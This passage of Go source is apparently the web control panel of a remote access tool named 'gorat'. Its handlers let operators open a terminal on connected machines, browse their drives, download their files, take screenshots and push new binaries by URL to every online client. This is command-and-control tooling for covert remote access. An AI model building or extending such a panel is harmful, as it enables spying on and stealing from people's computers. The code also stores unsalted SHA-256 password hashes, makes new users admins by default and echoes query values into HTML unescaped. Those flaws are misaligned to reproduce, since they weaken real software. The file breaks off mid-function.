package server

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"gorat/pkg/auth"
	"gorat/pkg/clients"
	"gorat/pkg/health"
	"gorat/pkg/protocol"
	"gorat/pkg/storage"

	"github.com/gin-gonic/gin"
)

// WebConfig holds web UI configuration
type WebConfig struct {
	Username string
	Password string
}

// WebHandler handles web UI requests
type WebHandler struct {
	sessionMgr auth.SessionManager
	clientMgr  clients.Manager
	store      storage.Store
	config     *WebConfig
	templates  *template.Template
	server     *Server // Reference to main server for result access
	healthMon  *health.Monitor
}

// NewWebHandler creates a new web handler
func NewWebHandler(sessionMgr auth.SessionManager, clientMgr clients.Manager, store storage.Store, config *WebConfig) (*WebHandler, error) {
	handler := &WebHandler{
		sessionMgr: sessionMgr,
		clientMgr:  clientMgr,
		store:      store,
		config:     config,
		templates:  nil, // Will be set if templates load successfully
		healthMon:  health.NewMonitor(),
	}

	// Try to load templates from disk (optional)
	templatesPath := filepath.Join("web", "templates", "*.html")
	tmpl, err := template.ParseGlob(templatesPath)
	if err != nil {
		log.Printf("WARNING: Failed to load web templates from %s: %v", templatesPath, err)
		log.Println("Web UI will use basic fallback responses")
		// Continue without templates - we'll provide API-only functionality
	} else {
		handler.templates = tmpl
		log.Printf("✅ Successfully loaded web templates from %s", templatesPath)
	}

	// Check if user initialization already happened (for debugging)
	if store != nil && config.Username != "" {
		adminExists, err := store.AdminExists()
		if err != nil {
			log.Printf("WARNING: Failed to check if admin user exists: %v", err)
		} else {
			log.Printf("DEBUG: Admin exists check in web handler: %v", adminExists)
		}
	}

	return handler, nil
}

// requireAuth middleware to check if user is authenticated
func (wh *WebHandler) requireAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session_id")
		if err != nil {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		session, exists := wh.sessionMgr.GetSession(cookie.Value)
		if !exists {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		// Refresh session
		wh.sessionMgr.RefreshSession(session.ID)

		next(w, r)
	}
}

// HandleLogin serves the login page
func (wh *WebHandler) HandleLogin(w http.ResponseWriter, r *http.Request) {
	// Check if already logged in
	if cookie, err := r.Cookie("session_id"); err == nil {
		if wh.sessionMgr != nil {
			if _, exists := wh.sessionMgr.GetSession(cookie.Value); exists {
				http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
				return
			}
		}
	}

	// Check if templates are available
	if wh.templates == nil {
		// Fallback to simple HTML response
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`<!DOCTYPE html>
<html><head><title>Login</title></head>
<body>
<h1>Login</h1>
<form method="POST" action="/api/login">
<input type="text" name="username" placeholder="Username" required><br><br>
<input type="password" name="password" placeholder="Password" required><br><br>
<input type="submit" value="Login">
</form>
</body></html>`))
		return
	}

	if err := wh.templates.ExecuteTemplate(w, "login.html", nil); err != nil {
		log.Printf("Error rendering login template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

// HandleLoginAPI processes login requests
func (wh *WebHandler) HandleLoginAPI(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var credentials struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&credentials); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Validate credentials against database if store is available
	if wh.store != nil {
		user, passwordHash, err := wh.store.GetWebUser(credentials.Username)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "Invalid username or password"})
			return
		}

		// Check if user is active
		if user.Status != "active" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "User account is inactive"})
			return
		}

		// Verify password
		hash := sha256.Sum256([]byte(credentials.Password))
		providedHash := hex.EncodeToString(hash[:])
		if providedHash != passwordHash {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "Invalid username or password"})
			return
		}

		// Update last login
		_ = wh.store.UpdateWebUserLastLogin(credentials.Username)
	} else {
		// Fallback to config credentials if store is not available
		if credentials.Username != wh.config.Username || credentials.Password != wh.config.Password {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "Invalid username or password"})
			return
		}
	}

	// Create session
	if wh.sessionMgr == nil {
		http.Error(w, "Session manager not available", http.StatusInternalServerError)
		return
	}

	session, err := wh.sessionMgr.CreateSession(credentials.Username)
	if err != nil {
		http.Error(w, "Failed to create session", http.StatusInternalServerError)
		return
	}

	// Set session cookie
	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    session.ID,
		Path:     "/",
		HttpOnly: true,
		Secure:   r.TLS != nil,
		SameSite: http.SameSiteStrictMode,
		Expires:  session.ExpiresAt,
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}

// HandleLogout processes logout requests
func (wh *WebHandler) HandleLogout(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	cookie, err := r.Cookie("session_id")
	if err == nil && wh.sessionMgr != nil {
		wh.sessionMgr.DeleteSession(cookie.Value)
	}

	// Clear cookie
	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}

// HandleDashboard serves the dashboard page
func (wh *WebHandler) HandleDashboard(w http.ResponseWriter, r *http.Request) {
	// Old dashboard deprecated: redirect to enhanced dashboard
	http.Redirect(w, r, "/dashboard-new", http.StatusSeeOther)
}

// HandleTerminalPage serves the terminal page
func (wh *WebHandler) HandleTerminalPage(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	if wh.templates == nil {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(fmt.Sprintf(`<!DOCTYPE html><html><head><title>Terminal</title></head><body><h1>Terminal for %s</h1><p>Templates not available. Use API endpoints.</p></body></html>`, clientID)))
		return
	}

	data := struct {
		ClientID string
	}{
		ClientID: clientID,
	}

	if err := wh.templates.ExecuteTemplate(w, "terminal.html", data); err != nil {
		log.Printf("Error rendering terminal template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

// HandleFilesPage serves the file manager page
func (wh *WebHandler) HandleFilesPage(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	if wh.templates == nil {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(fmt.Sprintf(`<!DOCTYPE html><html><head><title>Files</title></head><body><h1>File Manager for %s</h1><p>Templates not available. Use API endpoints.</p></body></html>`, clientID)))
		return
	}

	// Get client metadata to determine OS
	client, exists := wh.clientMgr.GetClient(clientID)
	clientOS := "linux" // default to linux/unix
	if exists && client != nil {
		meta := client.Metadata()
		if meta != nil && meta.OS != "" {
			clientOS = meta.OS
		}
	}

	data := struct {
		ClientID string
		ClientOS string
	}{
		ClientID: clientID,
		ClientOS: clientOS,
	}

	if err := wh.templates.ExecuteTemplate(w, "files.html", data); err != nil {
		log.Printf("Error rendering files template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

// HandleDashboardNew serves the new enhanced dashboard page
func (wh *WebHandler) HandleDashboardNew(w http.ResponseWriter, r *http.Request) {
	if wh.templates == nil {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`<!DOCTYPE html><html><head><title>Dashboard</title></head><body><h1>Enhanced Dashboard</h1><p>Templates not available. Use API endpoints.</p></body></html>`))
		return
	}

	if err := wh.templates.ExecuteTemplate(w, "dashboard-new.html", nil); err != nil {
		log.Printf("Error rendering dashboard-new template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

// HandleClientDetails serves the client details page
func (wh *WebHandler) HandleClientDetails(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	if wh.templates == nil {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(fmt.Sprintf(`<!DOCTYPE html><html><head><title>Client Details</title></head><body><h1>Client Details: %s</h1><p>Templates not available. Use API endpoints.</p></body></html>`, clientID)))
		return
	}

	data := struct {
		ClientID string
	}{
		ClientID: clientID,
	}

	if err := wh.templates.ExecuteTemplate(w, "client-details.html", data); err != nil {
		log.Printf("Error rendering client-details template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

// HandleClientsAPI returns the list of connected clients (protected by auth)
func (wh *WebHandler) HandleClientsAPI(w http.ResponseWriter, r *http.Request) {
	// Check authentication
	cookie, err := r.Cookie("session_id")
	if err != nil || wh.sessionMgr == nil {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}

	if _, exists := wh.sessionMgr.GetSession(cookie.Value); !exists {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}

	// Merge persisted clients (including offline) with live clients (online)
	clientsMap := make(map[string]*protocol.ClientMetadata)

	// Persisted clients from storage capture offline records
	if wh.store != nil {
		if persisted, err := wh.store.GetAllClients(); err == nil {
			for _, c := range persisted {
				copy := *c
				clientsMap[c.ID] = &copy
			}
		} else {
			log.Printf("Error loading persisted clients: %v", err)
		}
	}

	// Live clients override with freshest status/fields
	for _, client := range wh.clientMgr.GetAllClients() {
		if meta := client.Metadata(); meta != nil {
			copy := *meta
			clientsMap[meta.ID] = &copy
		}
	}

	// Flatten to slice
	metadata := make([]*protocol.ClientMetadata, 0, len(clientsMap))
	for _, m := range clientsMap {
		metadata = append(metadata, m)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(metadata)
}

// HandleClientUpdatesAPI returns current metadata for specified client IDs
func (wh *WebHandler) HandleClientUpdatesAPI(w http.ResponseWriter, r *http.Request) {
	// Auth check
	cookie, err := r.Cookie("session_id")
	if err != nil || wh.sessionMgr == nil {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}
	if _, exists := wh.sessionMgr.GetSession(cookie.Value); !exists {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}

	// Parse body: {"ids": ["id1", "id2", ...]}
	var req struct {
		IDs []string `json:"ids"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if len(req.IDs) == 0 {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"clients": []interface{}{}, "missing": []string{}})
		return
	}

	// Build response for requested IDs only
	clientsResp := make([]*protocol.ClientMetadata, 0, len(req.IDs))
	missing := make([]string, 0)

	for _, id := range req.IDs {
		client, exists := wh.clientMgr.GetClient(id)
		if !exists || client == nil {
			missing = append(missing, id)
			continue
		}
		meta := client.Metadata()
		if meta == nil {
			// Minimal payload with unknown status
			clientsResp = append(clientsResp, &protocol.ClientMetadata{ID: id, Status: "unknown"})
			continue
		}
		// Provide minimal fields useful for status change detection
		clientsResp = append(clientsResp, &protocol.ClientMetadata{
			ID:            meta.ID,
			Hostname:      meta.Hostname,
			Alias:         meta.Alias,
			OS:            meta.OS,
			Arch:          meta.Arch,
			Status:        meta.Status,
			PublicIP:      meta.PublicIP,
			LastSeen:      meta.LastSeen,
			LastHeartbeat: meta.LastHeartbeat,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"clients": clientsResp,
		"missing": missing,
	})
}

// HandleClientSearchAPI returns clients matching a query string (id/hostname/alias/os/ip)
func (wh *WebHandler) HandleClientSearchAPI(w http.ResponseWriter, r *http.Request) {
	// Auth check
	cookie, err := r.Cookie("session_id")
	if err != nil || wh.sessionMgr == nil {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}
	if _, exists := wh.sessionMgr.GetSession(cookie.Value); !exists {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
		return
	}

	q := r.URL.Query().Get("q")
	if q == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode([]interface{}{})
		return
	}

	// Case-insensitive contains across persisted + live clients
	qLower := strings.ToLower(q)
	candidates := make(map[string]*protocol.ClientMetadata)

	if wh.store != nil {
		if persisted, err := wh.store.GetAllClients(); err == nil {
			for _, c := range persisted {
				copy := *c
				candidates[c.ID] = &copy
			}
		}
	}
	for _, c := range wh.clientMgr.GetAllClients() {
		if meta := c.Metadata(); meta != nil {
			copy := *meta
			candidates[meta.ID] = &copy
		}
	}

	res := make([]*protocol.ClientMetadata, 0)
	for _, meta := range candidates {
		if meta == nil {
			continue
		}
		if strings.Contains(strings.ToLower(meta.ID), qLower) ||
			strings.Contains(strings.ToLower(meta.Hostname), qLower) ||
			strings.Contains(strings.ToLower(meta.Alias), qLower) ||
			strings.Contains(strings.ToLower(meta.OS), qLower) ||
			strings.Contains(strings.ToLower(meta.IP), qLower) ||
			strings.Contains(strings.ToLower(meta.PublicIP), qLower) {
			res = append(res, &protocol.ClientMetadata{
				ID:       meta.ID,
				Hostname: meta.Hostname,
				Alias:    meta.Alias,
				OS:       meta.OS,
				Arch:     meta.Arch,
				Status:   meta.Status,
				PublicIP: meta.PublicIP,
				LastSeen: meta.LastSeen,
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(res)
}

// HandleFileBrowse handles file browsing requests
func (wh *WebHandler) HandleFileBrowse(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	log.Printf("[FileBrowse] Received path: '%s' for client '%s'", req.Path, req.ClientID)

	// Get client
	client, ok := wh.clientMgr.GetClient(req.ClientID)
	if !ok || client == nil {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	// Clear any previous result
	wh.server.ClearFileListResult(req.ClientID)

	// Send file browse request
	msg, err := protocol.NewMessage(protocol.MsgTypeBrowseFiles, protocol.BrowseFilesPayload{
		Path: req.Path,
	})
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, "Failed to send request", http.StatusInternalServerError)
		return
	}

	// Wait for response with timeout
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			http.Error(w, "Request timeout", http.StatusRequestTimeout)
			return
		case <-ticker.C:
			if result := wh.server.GetFileListResult(req.ClientID); result != nil {
				w.Header().Set("Content-Type", "application/json; charset=utf-8")
				json.NewEncoder(w).Encode(result)
				wh.server.ClearFileListResult(req.ClientID)
				return
			}
		}
	}
}

// HandleGetDrives handles drive listing requests (Windows)
func (wh *WebHandler) HandleGetDrives(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"client_id"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Get client
	client, ok := wh.clientMgr.GetClient(req.ClientID)
	if !ok || client == nil {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	// Clear any previous result
	wh.server.ClearDriveListResult(req.ClientID)

	// Send drive list request
	msg, err := protocol.NewMessage(protocol.MsgTypeGetDrives, nil)
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, "Failed to send request", http.StatusInternalServerError)
		return
	}

	// Wait for response with timeout
	timeout := time.After(10 * time.Second)
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			http.Error(w, "Request timeout", http.StatusRequestTimeout)
			return
		case <-ticker.C:
			if result := wh.server.GetDriveListResult(req.ClientID); result != nil {
				w.Header().Set("Content-Type", "application/json; charset=utf-8")
				json.NewEncoder(w).Encode(result)
				wh.server.ClearDriveListResult(req.ClientID)
				return
			}
		}
	}
}

// HandleFileDownload handles file download requests
func (wh *WebHandler) HandleFileDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	client, ok := wh.clientMgr.GetClient(req.ClientID)
	if !ok || client == nil {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	wh.server.ClearFileDataResult(req.ClientID)

	msg, err := protocol.NewMessage(protocol.MsgTypeDownloadFile, protocol.FileDataPayload{
		Path: req.Path,
	})
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, "Failed to send request", http.StatusInternalServerError)
		return
	}

	timeout := time.After(60 * time.Second)
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			http.Error(w, "Request timeout", http.StatusRequestTimeout)
			return
		case <-ticker.C:
			if result := wh.server.GetFileDataResult(req.ClientID); result != nil {
				if result.Error != "" {
					http.Error(w, result.Error, http.StatusInternalServerError)
					wh.server.ClearFileDataResult(req.ClientID)
					return
				}

				w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(result.Path)+"\"")
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Write(result.Data)
				wh.server.ClearFileDataResult(req.ClientID)
				return
			}
		}
	}
}

// HandleGlobalUpdate handles global update requests for all clients
func (wh *WebHandler) HandleGlobalUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Version  string            `json:"version"`
		URLs     map[string]string `json:"urls"`      // platform -> URL mapping
		Checksum map[string]string `json:"checksums"` // platform -> checksum mapping
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Validate inputs
	if req.Version == "" {
		http.Error(w, "Version is required", http.StatusBadRequest)
		return
	}

	if len(req.URLs) == 0 {
		http.Error(w, "At least one platform URL is required", http.StatusBadRequest)
		return
	}

	log.Printf("Global update initiated: version=%s, platforms=%d", req.Version, len(req.URLs))

	// Get all online clients
	allClients := wh.clientMgr.GetAllClients()
	onlineClients := []*protocol.ClientMetadata{}
	for _, client := range allClients {
		if meta := client.Metadata(); meta != nil && meta.Status == "online" {
			onlineClients = append(onlineClients, meta)
		}
	}

	if len(onlineClients) == 0 {
		http.Error(w, "No online clients to update", http.StatusBadRequest)
		return
	}

	// Send platform-specific update to each client
	successCount := 0
	failCount := 0
	skippedCount := 0
	platformStats := make(map[string]int)

	for _, client := range onlineClients {
		// Build platform identifier (e.g., "windows/amd64", "linux/amd64")
		platform := client.OS + "/" + client.Arch
		platformStats[platform]++

		// Get URL for this platform
		downloadURL, hasURL := req.URLs[platform]
		if !hasURL {
			log.Printf("No URL provided for platform %s, skipping client %s", platform, client.ID)
			skippedCount++
			continue
		}

		// Get checksum for this platform (optional)
		checksum := ""
		if req.Checksum != nil {
			checksum = req.Checksum[platform]
		}

		// Create platform-specific update payload
		updatePayload := protocol.UpdatePayload{
			Version:     req.Version,
			DownloadURL: downloadURL,
			Checksum:    checksum,
		}

		msg, err := protocol.NewMessage(protocol.MsgTypeUpdate, updatePayload)
		if err != nil {
			log.Printf("Failed to create message for client %s: %v", client.ID, err)
			failCount++
			continue
		}

		if err := wh.clientMgr.SendToClient(client.ID, msg); err != nil {
			log.Printf("Failed to send update to client %s (%s): %v", client.ID, platform, err)
			failCount++
		} else {
			log.Printf("Update sent to client %s (%s)", client.ID, platform)
			successCount++
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":         "success",
		"total_clients":  len(onlineClients),
		"success_count":  successCount,
		"fail_count":     failCount,
		"skipped_count":  skippedCount,
		"version":        req.Version,
		"platform_stats": platformStats,
		"message":        "Update command sent to online clients",
	})
}

// HandleHealthAPI returns server health status
func (wh *WebHandler) HandleHealthAPI(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	activeClients := len(wh.clientMgr.GetAllClients())
	healthStatus := wh.healthMon.GetHealth(activeClients)

	// Set status code based on health
	statusCode := http.StatusOK
	if healthStatus.Status == health.StatusUnhealthy {
		statusCode = http.StatusServiceUnavailable
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(healthStatus)
}

// ginHandleHealthAPI handles health endpoint with Gin
func (wh *WebHandler) ginHandleHealthAPI(c *gin.Context) {
	activeClients := len(wh.clientMgr.GetAllClients())
	healthStatus := wh.healthMon.GetHealth(activeClients)

	// Set status code based on health
	statusCode := http.StatusOK
	if healthStatus.Status == health.StatusUnhealthy {
		statusCode = http.StatusServiceUnavailable
	}

	c.JSON(statusCode, healthStatus)
}

// RegisterWebRoutes registers all web UI routes
func (wh *WebHandler) RegisterWebRoutes(mux *http.ServeMux) {
	// Public routes (no auth required)
	mux.HandleFunc("/login", wh.HandleLogin)
	mux.HandleFunc("/api/login", wh.HandleLoginAPI)
	mux.HandleFunc("/api/logout", wh.HandleLogout)
	mux.HandleFunc("/api/health", wh.HandleHealthAPI)

	// User management API routes
	mux.HandleFunc("/api/users", wh.requireAuth(wh.HandleUsersAPI))
	mux.HandleFunc("/api/users/", wh.requireAuth(wh.HandleUserAPI))

	// Protected routes
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.Redirect(w, r, "/dashboard-new", http.StatusSeeOther)
			return
		}
		http.NotFound(w, r)
	})
	mux.HandleFunc("/dashboard", wh.requireAuth(wh.HandleDashboard))
	mux.HandleFunc("/dashboard-new", wh.requireAuth(wh.HandleDashboardNew))
	mux.HandleFunc("/client-details", wh.requireAuth(wh.HandleClientDetails))
	mux.HandleFunc("/terminal", wh.requireAuth(wh.HandleTerminalPage))
	mux.HandleFunc("/files", wh.requireAuth(wh.HandleFilesPage))
	mux.HandleFunc("/api/files/browse", wh.requireAuth(wh.HandleFileBrowse))
	mux.HandleFunc("/api/files/drives", wh.requireAuth(wh.HandleGetDrives))
	mux.HandleFunc("/api/files/download", wh.requireAuth(wh.HandleFileDownload))
	mux.HandleFunc("/api/screenshot", wh.requireAuth(wh.HandleScreenshotRequest))
	mux.HandleFunc("/api/update/global", wh.requireAuth(wh.HandleGlobalUpdate))

	// Clients UI optimization endpoints
	mux.HandleFunc("/api/clients/update", wh.requireAuth(wh.HandleClientUpdatesAPI))
	mux.HandleFunc("/api/clients/search", wh.requireAuth(wh.HandleClientSearchAPI))
}

// HandleUsersAPI handles GET (list users) and POST (create user) requests
func (wh *WebHandler) HandleUsersAPI(w http.ResponseWriter, r *http.Request) {
	if wh.store == nil {
		http.Error(w, "User management not available", http.StatusServiceUnavailable)
		return
	}

	switch r.Method {
	case http.MethodGet:
		// List all users
		users, err := wh.store.GetAllWebUsers()
		if err != nil {
			log.Printf("Error getting users: %v", err)
			http.Error(w, "Failed to get users", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(users)

	case http.MethodPost:
		// Create new user
		var req struct {
			Username string `json:"username"`
			Password string `json:"password"`
			FullName string `json:"full_name"`
			Role     string `json:"role"`
		}

		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		if req.Username == "" || req.Password == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{"error": "Username and password are required"})
			return
		}

		if len(req.Password) < 6 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{"error": "Password must be at least 6 characters"})
			return
		}

		// Check if user already exists
		exists, err := wh.store.UserExists(req.Username)
		if err != nil {
			log.Printf("Error checking user existence: %v", err)
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
		if exists {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]string{"error": "Username already exists"})
			return
		}

		// Set default role if not provided
		if req.Role == "" {
			req.Role = "admin"
		}

		// Hash password before storing
		hash := sha256.Sum256([]byte(req.Password))
		passwordHash := hex.EncodeToString(hash[:])

		// Create user
		if err := wh.store.CreateWebUser(req.Username, passwordHash, req.FullName, req.Role); err != nil {
			log.Printf("Error creating user: %v", err)
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{"error": "Failed to create user"})
			return
		}

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "User created successfully"})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// HandleUserAPI handles PUT (update user) and DELETE (delete user) requests
func (wh *WebHandler) HandleUserAPI(w http.ResponseWriter, r *http.Request) {
	if wh.store == nil {
		http.Error(w, "User management not available", http.StatusServiceUnavailable)
		return
	}

	// Extract username from URL path
	username := r.URL.Path[len("/api/users/"):]
	if username == "" {
		http.Error(w, "Username required", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodPut:
		// Update user (status, role, password, full_name, etc.)
		var req struct {
			Status   string `json:"status"`
			Role     string `json:"role"`
			FullName string `json:"full_name"`
			Password string `json:"password"`
		}

		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		// Get current user
		_, _, err := wh.store.GetWebUser(username)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]string{"error": "User not found"})
			return
		}

		// Handle status update (active/inactive)
		if req.Status != "" {
			if req.Status != "active" && req.Status != "inactive" {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(map[string]string{"error": "Status must be 'active' or 'inactive'"})
				return
			}
			if err := wh.store.UpdateWebUserStatus(username, req.Status); err != nil {
				log.Printf("Error updating user status: %v", err)
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]string{"error": "Failed to update user status"})
				return
			}
		}

		// Prepare updates for password and full name
		var passwordHash *string
		var fullName *string

		// Handle password update with hashing
		if req.Password != "" {
			if len(req.Password) < 6 {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(map[string]string{"error": "Password must be at least 6 characters"})
				return
			}
			// Hash the new password
			hash := sha256.Sum256([]byte(req.Password))
			hashStr := hex.EncodeToString(hash[:])
			passwordHash = &hashStr
		}

		// Handle full name update
		if req.FullName != "" {
			fullName = &req.FullName
		}

		// Update other fields if provided
		if passwordHash != nil || fullName != nil {
			if err := wh.store.UpdateWebUser(username, fullName, passwordHash); err != nil {
				log.Printf("Error updating user: %v", err)
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]string{"error": "Failed to update user"})
				return
			}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "User updated successfully"})

	case http.MethodDelete:
		// Delete user
		if err := wh.store.DeleteWebUser(username); err != nil {
			log.Printf("Error deleting user: %v", err)
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
